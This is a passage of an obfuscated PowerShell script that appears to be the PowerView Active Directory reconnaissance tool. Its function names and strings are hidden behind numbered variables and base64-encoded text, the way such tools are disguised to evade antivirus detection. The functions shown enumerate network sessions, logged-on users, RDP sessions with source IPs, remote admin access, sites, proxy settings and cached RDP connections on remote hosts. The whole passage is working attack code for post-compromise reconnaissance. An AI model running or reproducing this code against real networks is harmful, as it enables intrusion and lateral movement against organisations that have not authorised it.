                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] ${58}).Message)"
            }
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function f89 {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${116} in ${94}) {
            ${203} = 10
            ${59} = [IntPtr]::Zero
            ${200} = 0
            ${202} = 0
            ${201} = 0
            ${58} = ${6}::NetSessionEnum(${116}, '', ${120}, ${203}, [ref]${59}, -1, [ref]${200}, [ref]${202}, [ref]${201})
            ${f1} = ${59}.ToInt64()
            if ((${58} -eq 0) -and (${f1} -gt 0)) {
                ${65} = ${17}::GetSize()
                for (${67} = 0; (${67} -lt ${200}); ${67}++) {
                    ${66} = New-Object System.Intptr -ArgumentList ${f1}
                    ${61} = ${66} -as ${17}
                    ${124} = ${61} | select *
                    ${124} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                    ${124}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
                    ${f1} = ${66}.ToInt64()
                    ${f1} += ${65}
                    ${124}
                }
                $Null = ${6}::NetApiBufferFree(${59})
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] ${58}).Message)"
            }
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function Get-RegLoggedOn {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${116} in ${94}) {
            try {
                ${166} = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADkANAB9AA=='))))
                ${166}.GetSubKeyNames() | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) } | % {
                    ${120} = f94 -438 $_ -f40 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))
                    if (${120}) {
                        ${120}, $UserDomain = ${120}.Split('@')
                    }
                    else {
                        ${120} = $_
                        $UserDomain = $Null
                    }
                    ${199} = New-Object PSObject
                    ${199} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADkANAB9AA==')))
                    ${199} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                    ${199} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${120}
                    ${199} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $_
                    ${199}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA='))))
                    ${199}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFIAZQBnAEwAbwBnAGcAZQBkAE8AbgBdACAARQByAHIAbwByACAAbwBwAGUAbgBpAG4AZwAgAHIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbwBuACAAJwAkAHsAOQA0AH0AJwAgADoAIAAkAF8A')))
            }
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function Get-NetRDPSession {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${116} in ${94}) {
            ${187} = ${4}::WTSOpenServerEx(${116})
            if (${187} -ne 0) {
                ${189} = [IntPtr]::Zero
                ${188} = 0
                ${58} = ${4}::WTSEnumerateSessionsEx(${187}, [ref]1, 0, [ref]${189}, [ref]${188});${64} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                ${f1} = ${189}.ToInt64()
                if ((${58} -ne 0) -and (${f1} -gt 0)) {
                    ${65} = ${22}::GetSize()
                    for (${67} = 0; (${67} -lt ${188}); ${67}++) {
                        ${66} = New-Object System.Intptr -ArgumentList ${f1}
                        ${61} = ${66} -as ${22}
                        ${191} = New-Object PSObject
                        if (${61}.pHostName) {
                            ${191} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${61}.pHostName
                        }
                        else {
                            ${191} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                        }
                        ${191} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))) ${61}.pSessionName
                        if ($(-not ${61}.pDomainName) -or (${61}.pDomainName -eq '')) {
                            ${191} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${61}.pUserName)"
                        }
                        else {
                            ${191} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${61}.pDomainName)\$(${61}.pUserName)"
                        }
                        ${191} | Add-Member Noteproperty 'ID' ${61}.SessionID
                        ${191} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAA=='))) ${61}.State
                        ${190} = [IntPtr]::Zero
                        ${198} = 0
                        ${197} = ${4}::WTSQuerySessionInformation(${187}, ${61}.SessionID, 14, [ref]${190}, [ref]${198});${196} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if (${197} -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] ${196}).Message)"
                        }
                        else {
                            ${195} = ${190}.ToInt64()
                            ${194} = New-Object System.Intptr -ArgumentList ${195}
                            ${193} = ${194} -as ${20}
                            ${192} = ${193}.Address
                            if (${192}[2] -ne 0) {
                                ${192} = [String]${192}[2]+'.'+[String]${192}[3]+'.'+[String]${192}[4]+'.'+[String]${192}[5]
                            }
                            else {
                                ${192} = $Null
                            }
                            ${191} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUASQBQAA=='))) ${192}
                            ${191}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAEQAUABTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
                            ${191}
                            $Null = ${4}::WTSFreeMemory(${190})
                            ${f1} += ${65}
                        }
                    }
                    $Null = ${4}::WTSFreeMemoryEx(2, ${189}, ${188})
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] ${64}).Message)"
                }
                $Null = ${4}::WTSCloseServer(${187})
            }
            else {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAE4AZQB0AFIARABQAFMAZQBzAHMAaQBvAG4AXQAgAEUAcgByAG8AcgAgAG8AcABlAG4AaQBuAGcAIAB0AGgAZQAgAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFMAZQBzAHMAaQBvAG4AIABIAG8AcwB0ACAAKABSAEQAIABTAGUAcwBzAGkAbwBuACAASABvAHMAdAApACAAcwBlAHIAdgBlAHIAIABmAG8AcgA6ACAAJAB7ADkANAB9AA==')))
            }
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function f80 {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${116} in ${94}) {
            ${187} = ${5}::OpenSCManagerW($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAxADEANgB9AA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAA=='))), 0xF003F);${64} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            ${186} = New-Object PSObject
            ${186} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
            if (${187} -ne 0) {
                $Null = ${5}::CloseServiceHandle(${187})
                ${186} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] ${64}).Message)"
                ${186} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $False
            }
            ${186}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAGQAbQBpAG4AQQBjAGMAZQBzAHMA'))))
            ${186}
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function f95 {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${116} in ${94}) {
            if (${116} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAD8AOgBbADAALQA5AF0AewAxACwAMwB9AFwALgApAHsAMwB9AFsAMAAtADkAXQB7ADEALAAzAH0AJAA=')))) {
                ${119} = ${116}
                ${116} = [System.Net.Dns]::GetHostByAddress(${116}) | select -ExpandProperty HostName
            }
            else {
                ${119} = @(f87 -94 ${116})[0].IPAddress
            }
            ${59} = [IntPtr]::Zero
            ${58} = ${6}::DsGetSiteName(${116}, [ref]${59})
            ${185} = New-Object PSObject
            ${185} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
            ${185} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${119}
            if (${58} -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(${59})
                ${185} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] ${58}).Message)"
                ${185} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) ''
            }
            ${185}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIAUwBpAHQAZQA='))))
            $Null = ${6}::NetApiBufferFree(${59})
            ${185}
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function Get-WMIRegProxy {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = ${Env:94},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${116} in ${94}) {
            try {
                ${158} = @{
                    'List' = $True
                    'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                    'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                    'Computername' = ${116}
                    'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${158}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                ${184} = gwmi @158
                ${105} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwASQBuAHQAZQByAG4AZQB0ACAAUwBlAHQAdABpAG4AZwBzAA==')))
                ${183} = 2147483649
                ${182} = ${184}.GetStringValue(${183}, ${105}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA==')))).sValue
                ${181} = ${184}.GetStringValue(${183}, ${105}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA=')))).sValue
                ${180} = ''
                if (${181} -and (${181} -ne '')) {
                    try {
                        ${180} = (New-Object Net.WebClient).DownloadString(${181})
                    }
                    catch {
                        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAARQByAHIAbwByACAAYwBvAG4AbgBlAGMAdABpAG4AZwAgAHQAbwAgAEEAdQB0AG8AQwBvAG4AZgBpAGcAVQBSAEwAIAA6ACAAJAB7ADEAOAAxAH0A')))
                    }
                }
                if (${182} -or ${181}) {
                    ${179} = New-Object PSObject
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA=='))) ${182}
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA='))) ${181}
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBwAGEAZAA='))) ${180}
                    ${179}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwB4AHkAUwBlAHQAdABpAG4AZwBzAA=='))))
                    ${179}
                }
                else {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAATgBvACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHUAbgBkACAAZgBvAHIAIAAkAHsAOQA0AH0A')))
                }
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAFAAcgBvAHgAeQBdACAARQByAHIAbwByACAAZQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHIAIAAkAHsAOQA0AH0AIAA6ACAAJABfAA==')))
            }
        }
    }
}
function Get-WMIRegLastLoggedOn {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${116} in ${94}) {
            ${178} = 2147483650
            ${158} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${116}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${158}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${166} = gwmi @158
                ${105} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQA=')))
                ${177} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA=')))
                ${176} = ${166}.GetStringValue(${178}, ${105}, ${177}).sValue
                ${175} = New-Object PSObject
                ${175} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                ${175} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBnAGUAZABPAG4A'))) ${176}
                ${175}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAGEAcwB0AEwAbwBnAGcAZQBkAE8AbgBVAHMAZQByAA=='))))
                ${175}
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEwAYQBzAHQATABvAGcAZwBlAGQATwBuAF0AIABFAHIAcgBvAHIAIABvAHAAZQBuAGkAbgBnACAAcgBlAG0AbwB0AGUAIAByAGUAZwBpAHMAdAByAHkAIABvAG4AIAAkAHsAMQAxADYAfQAuACAAUgBlAG0AbwB0AGUAIAByAGUAZwBpAHMAdAByAHkAIABsAGkAawBlAGwAeQAgAG4AbwB0ACAAZQBuAGEAYgBsAGUAZAAuAA==')))
            }
        }
    }
}
function Get-WMIRegCachedRDPConnection {
    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach (${116} in ${94}) {
            ${165} = 2147483651
            ${158} = @{
                'List' = $True
                'Class' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                'Namespace' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                'Computername' = ${116}
                'ErrorAction' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${158}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            try {
                ${166} = gwmi @158
                ${168} = (${166}.EnumKey(${165}, '')).sNames | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) }
                ForEach (${164} in ${168}) {
                    try {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${120} = f94 -438 ${164} -Credential $Credential
                        }
                        else {
                            ${120} = f94 -438 ${164}
                        }
                        ${174} = ${166}.EnumValues(${165},$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANgA0AH0AXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAAQwBsAGkAZQBuAHQAXABEAGUAZgBhAHUAbAB0AA==')))).sNames
                        ForEach (${173} in ${174}) {
                            if (${173} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBSAFUALgAqAA==')))) {
                                ${172} = ${166}.GetStringValue(${165}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANgA0AH0AXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAAQwBsAGkAZQBuAHQAXABEAGUAZgBhAHUAbAB0AA=='))), ${173}).sValue
                                ${169} = New-Object PSObject
                                ${169} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                                ${169} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${120}
                                ${169} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${164}
                                ${169} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) ${172}
                                ${169} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) $Null
                                ${169}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))))
                                ${169}
                            }
                        }
                        ${171} = ${166}.EnumKey(${165},$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANgA0AH0AXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAAQwBsAGkAZQBuAHQAXABTAGUAcgB2AGUAcgBzAA==')))).sNames
                        ForEach ($Server in ${171}) {
                            ${170} = ${166}.GetStringValue(${165}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANgA0AH0AXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAAQwBsAGkAZQBuAHQAXABTAGUAcgB2AGUAcgBzAFwAJABTAGUAcgB2AGUAcgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA')))).sValue
                            ${169} = New-Object PSObject
                            ${169} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                            ${169} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${120}
                            ${169} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) ${164}
                            ${169} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAHIAdgBlAHIA'))) $Server
                            ${169} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) ${170}
                            ${169}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAGEAYwBoAGUAZABSAEQAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA=='))))
                            ${169}
                        }
                    }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFcATQBJAFIAZQBnAEMAYQBjAGgAZQBkAFIARABQAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEUAcgByAG8AcgA6ACAAJABfAA==')))
                    }
                }
            }
            catch {
